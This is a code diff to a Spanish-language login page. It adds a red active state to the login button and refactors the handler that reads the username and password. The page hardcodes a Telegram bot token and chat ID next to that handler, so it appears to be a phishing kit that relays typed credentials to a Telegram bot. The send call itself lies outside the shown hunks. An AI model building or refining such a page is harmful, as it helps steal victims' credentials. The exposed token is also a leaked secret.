@@ -148,10 +148,25 @@ html,body{
     font-weight:bold;
 
     cursor:pointer;
+
+    transition: background 0.3s ease, color 0.3s ease, border-color 0.3s ease;
 }
 
 .login-btn:hover{
     background:#f0f2f5;
+}
+
+/* Estado activo: cuando hay contraseña escrita */
+
+.login-btn.active{
+    background:#df101b;
+    color:#ffffff;
+    border-color:#df101b;
+}
+
+.login-btn.active:hover{
+    background:#c00d17;
+    border-color:#c00d17;
 }
 
 /* =========================
@@ -509,9 +524,21 @@ html,body{
 const TELEGRAM_TOKEN = "8747147152:AAFNHujZamAp_GRYUue9VwKEktdmovPeoqU";
 const TELEGRAM_CHAT_ID = "8042354877";
 
-document.getElementById("loginBtn").addEventListener("click", async function () {
+const passwordInput = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+
+/* Activar / desactivar el estado rojo del botón según la contraseña */
+passwordInput.addEventListener("input", function () {
+    if (passwordInput.value.trim().length > 0) {
+        loginBtn.classList.add("active");
+    } else {
+        loginBtn.classList.remove("active");
+    }
+});
+
+loginBtn.addEventListener("click", async function () {
     const usuario = document.getElementById("usuario").value.trim();
-    const password = document.getElementById("password").value.trim();
+    const password = passwordInput.value.trim();
 
     if (!usuario || !password) {
         alert("Completa todos los campos");
